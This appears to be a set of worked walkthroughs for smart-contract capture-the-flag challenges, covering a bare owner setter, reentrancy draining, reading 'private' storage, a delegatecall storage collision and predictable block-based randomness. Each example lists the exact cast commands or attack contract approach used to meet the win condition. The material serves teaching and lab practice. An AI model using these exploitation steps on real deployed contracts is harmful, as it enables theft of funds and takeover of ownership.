# Worked examples — the decision walk-throughs

## Example 1 — `isSolved() = owner() == tx.origin`

```text
the predicate: the caller must be the owner
the inventory: setOwner(address) — no onlyOwner — a bare setter
the class:     access-control
the call:      cast send $CH "setOwner(address)" $ME --private-key $KEY --rpc-url $RPC
the verify:    cast call $CH "owner()(address)" → $ME; cast call $SETUP "isSolved()(bool)" → true
```

One `cast send` — the bare setter was the intended solve.

## Example 2 — `isSolved() = address(challenge).balance == 0`

```text
the predicate: the contract must hold 0 ether
the inventory: withdraw() does call{value} then balances-= → reentrancy
the class:     reentrancy
the contract:  a Reenter with a receive-hook → deposit + withdraw → drains
the verify:    cast balance $CH → 0; isSolved() → true
```

An attack contract — the `receive` re-entered until the balance was gone.

## Example 3 — `isSolved() = locked() == false`, a `private password` gate

```text
the predicate: the contract must unlock
the inventory: unlock(bytes32) requires _p == password; password is private
the class:     visibility
the read:      cast storage $CH 1 → the password
the call:      cast send $CH "unlock(bytes32)" 0x<pw>
the verify:    locked() → false; isSolved() → true
```

A `cast storage` read + a `cast send` — `private` is not secret.

## Example 4 — `isSolved() = challenge.owner() == player`, a delegatecall proxy

```text
the predicate: own the proxy's owner slot
the inventory: the proxy's fallback delegatecalls the impl; the impl's setA
               writes slot0 — the proxy's impl_addr!
the class:     storage-collision
the call:      cast send $PROXY "setA(address)" $EVIL → impl = evil;
               then cast send $PROXY "pwn()" → the delegatecall writes owner
the verify:    owner() → the caller
```

A two-step — the collision redirected the delegatecall to attacker code.

## Example 5 — `isSolved() = guess == answer`, `block.timestamp`-fed

```text
the predicate: guess the answer
the inventory: guess(uint) computes answer = keccak(blockhash(n-1), timestamp)
the class:     weak-randomness
the contract:  a Predict contract computing the same answer in the same tx
the verify:    isSolved() → true after Predict.attack
```

The same-block compute — the "random" is reproducible.
